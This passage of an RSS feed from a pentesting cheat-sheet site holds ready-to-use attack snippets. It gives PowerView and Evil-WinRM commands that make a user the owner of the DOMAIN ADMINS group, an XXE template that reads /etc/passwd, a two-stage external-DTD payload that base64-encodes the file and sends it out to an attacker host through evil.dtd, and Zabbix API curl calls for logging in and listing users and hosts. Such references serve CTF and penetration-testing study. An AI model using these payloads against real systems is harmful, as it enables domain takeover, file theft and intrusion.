      <description>Abuse #1 : Change owner of the group Linux Windows # With password sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; Set-DomainObjectOwner -TargetIdentity &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; -PrincipalIdentity &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\maria&amp;gt; . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; -OwnerIdentity &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; *Evil-WinRM* PS C:\Users\maria&amp;gt; Set-DomainObjectOwner -Identity &amp;#39;DOMAIN ADMINS&amp;#39; -OwnerIdentity &amp;#39;maria&amp;#39; Abuse #2 : Add user to the group Linux Windows 1. Add full control permission to the user over the group impacket bloodyAD powerview.</description>
    </item>
    <item>
      <title>XXE (XML External Entity)</title>
      <link>https://tldrbins.github.io/xxe/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/xxe/</guid>
      <description>XXE Template &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY data SYSTEM &amp;#34;/etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;data;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; External DTD (2 stage) &amp;lt;!ENTITY % data SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=/etc/passwd&amp;#34;&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY exfil SYSTEM &amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;/data?%data;&amp;#39;&amp;gt;&amp;#34;&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % bar SYSTEM &amp;#34;http://&amp;lt;LOCAL_IP&amp;gt;/evil.dtd&amp;#34;&amp;gt; %bar; %eval; ]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;exfil;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; </description>
    </item>
    <item>
      <title>Zabbix</title>
      <link>https://tldrbins.github.io/zabbix/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/zabbix/</guid>
      <description>Zabbix API General # Auth with cred curl &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.php -H &amp;#34;Content-Type: application/json-rpc&amp;#34; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;, &amp;#34;method&amp;#34;:&amp;#34;user.login&amp;#34;, &amp;#34;id&amp;#34;:1, &amp;#34;auth&amp;#34;:null, &amp;#34;params&amp;#34;:{&amp;#34;user&amp;#34;: &amp;#34;&amp;lt;USER&amp;gt;&amp;#34;, &amp;#34;password&amp;#34;: &amp;#34;&amp;lt;PASSWORD&amp;gt;&amp;#34;}}&amp;#39; # Get users curl -s &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.php -H &amp;#34;Content-Type: application/json-rpc&amp;#34; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;, &amp;#34;method&amp;#34;:&amp;#34;user.get&amp;#34;, &amp;#34;id&amp;#34;:1, &amp;#34;auth&amp;#34;:&amp;#34;&amp;lt;AUTH&amp;gt;&amp;#34;, &amp;#34;params&amp;#34;:{&amp;#34;output&amp;#34;: &amp;#34;extend&amp;#34;}}&amp;#39; | jq . # Get hosts curl -s &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.php -H &amp;#34;Content-Type: application/json-rpc&amp;#34; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;, &amp;#34;method&amp;#34;:&amp;#34;host.get&amp;#34;, &amp;#34;id&amp;#34;:1, &amp;#34;auth&amp;#34;:&amp;#34;&amp;lt;AUTH&amp;gt;&amp;#34;, &amp;#34;params&amp;#34;:{}}&amp;#39; | jq . # Get user group info curl -s &amp;lt;TARGET&amp;gt;/zabbix/api_jsonrpc.php -H &amp;#34;Content-Type: application/json-rpc&amp;#34; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.</description>
    </item>
  </channel>
</rss>
